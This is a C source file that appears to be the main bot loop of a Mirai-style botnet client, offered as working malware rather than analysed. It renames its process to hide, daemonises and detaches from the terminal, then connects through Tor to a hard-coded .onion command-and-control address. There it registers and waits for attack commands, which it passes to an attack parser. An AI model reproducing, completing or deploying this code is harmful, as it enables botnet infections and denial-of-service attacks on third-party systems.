#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/prctl.h>

#include "tor.h"
#include "rand.h"
#include "utils.h"
#include "mutex.h"
#include "attacks.h"
#include "resolv.h"

#define CONN_CONNECTING		1
#define CONN_ESTABLISHED	2

static void main_task_worker(int argc, char *argv[])
{
	// Watchdogs woker thread
}

int main(int argc, char *argv[])
{
	uint8_t conn_state, reg_len;
	fd_set wrset, rdset;
	int socket_fd = -1, fds;
	char packet_reg[64], name[16], *mutex;

	rand_init();
	mutex = mutex_new_instance();
    if (!mutex)
    {
#ifdef DEBUG
        printf("[main] Failed to allocated memory for mutex\n");
#endif
        return 0;
    }

    if (argc > 1)
    {
        utils_memset(name, 0, sizeof(name));
        utils_memcpy(name, argv[1], utils_strlen(argv[1]));
    }

    utils_memcpy(argv[0], mutex, MUTEX_LEN);
    prctl(PR_SET_NAME, mutex);
    free(mutex);

	if (argc > 1)
	{
		reg_len = utils_strlen(name);

		if (reg_len > 16)
			return 0;

		utils_memset(packet_reg, 0, sizeof(packet_reg));
		utils_memcpy(packet_reg, "\x02", 1);
		utils_memcpy(packet_reg + 1, &reg_len, sizeof(uint8_t));
		utils_memcpy(packet_reg + 1 + sizeof(uint8_t), name, reg_len);
	}
	else
	{
		reg_len = 4;
		utils_memset(packet_reg, 0, sizeof(packet_reg));
		utils_memcpy(packet_reg, "\x02", 1);
		utils_memcpy(packet_reg + 1, &reg_len, sizeof(uint8_t));
		utils_memcpy(packet_reg + 1 + sizeof(uint8_t), "null", reg_len);
	}	

	write(0, "listening tun0", 14); // Yes we are the notorious mirai botnet
	write(0, "\n", 1);

#ifndef DEBUG
	if (fork() > 0)
		return 0;

   	close(0);
    close(1);
    close(2);

	setsid();
	signal(SIGCHLD, SIG_IGN);
#endif

	local_addr = utils_local_addr();
	attacks_init();
	main_task_worker(argc, argv);

	while (1)
	{
		struct timeval timeout;      

		if (socket_fd == -1)
		{
			if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			{
				sleep(5);
				continue;
			}
			
			fcntl(socket_fd, F_SETFL, fcntl(socket_fd, F_GETFL, 0) | O_NONBLOCK);
			
			if (tor_setup_fd(socket_fd, "wuuduaksz6st4qud.onion", 22) != 1)
			{
				printf("failed setup\n");
				close(socket_fd);
				socket_fd = -1;
				sleep(5);
				continue;
			}

			conn_state = CONN_CONNECTING;
			continue;
		}

		FD_ZERO(&rdset);
        FD_ZERO(&wrset);

		if (FD_ISSET(socket_fd, &wrset) != 0)
			FD_CLR(socket_fd, &wrset);

		if (FD_ISSET(socket_fd, &rdset) != 0)
			FD_CLR(socket_fd, &rdset);

		if (conn_state == CONN_CONNECTING)
			FD_SET(socket_fd, &wrset);
		else if (conn_state == CONN_ESTABLISHED)
			FD_SET(socket_fd, &rdset);

		timeout.tv_sec = 10;
    	timeout.tv_usec = 0;

		fds = select(socket_fd + 1, &rdset, &wrset, NULL, &timeout);
		if (fds > 0)
		{
			if (FD_ISSET(socket_fd, &wrset) != 0 && conn_state == CONN_CONNECTING)
			{
				int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                	if (err)
                {                	
#ifdef DEBUG
                	printf("[bot] Failed to connect to CNC\n");
#endif
					close(socket_fd);
					socket_fd = -1;
					sleep(5);
					continue;
                }
                else
                {
#ifdef DEBUG
                	printf("[bot] Established connection to CNC\n");
#endif
                	send(socket_fd, packet_reg, 1 + sizeof(uint8_t) + reg_len, MSG_NOSIGNAL);
                	conn_state = CONN_ESTABLISHED;
                	continue;
                }
			}
			else if (FD_ISSET(socket_fd, &rdset) != 0 && conn_state == CONN_ESTABLISHED)
			{
               	int ret;     	
               	char buffer[512];

                if ((ret = recv(socket_fd, buffer, sizeof(buffer), MSG_NOSIGNAL)) <= 0)
                {
                	if ((errno == EWOULDBLOCK || errno == EAGAIN) && ret != -1)
                		continue;  
#ifdef DEBUG
					printf("[bot] Lost connection from CNC\n");
#endif
					close(socket_fd);
					socket_fd = -1;
					sleep(5);
					continue;
                }

                if (buffer[0] == '\x01')
                {
                	// Attack command
					attacks_parse(buffer + 1, ret - 1);
					utils_memset(buffer, 0, sizeof(buffer));
					continue;
                }

                utils_memset(buffer, 0, sizeof(buffer));
                continue;
			}
		}
		else if (fds == -1)
		{
#ifdef DEBUG
			printf("[bot] Unknown error while connecting to CNC\n");
#endif
			close(socket_fd);
			socket_fd = -1;
			sleep(5);
			continue;
		}
		else
		{
			if (conn_state == CONN_CONNECTING)
			{
				// Timeout
#ifdef DEBUG
                printf("[bot] Timed-out while connecting to CNC\n");
#endif
				close(socket_fd);
				socket_fd = -1;
				sleep(5);
				continue;
			}
			else
			{
				// Send ping
				send(socket_fd, "\x01", 1, MSG_NOSIGNAL);
			}
		}
	}

	return 0;
}
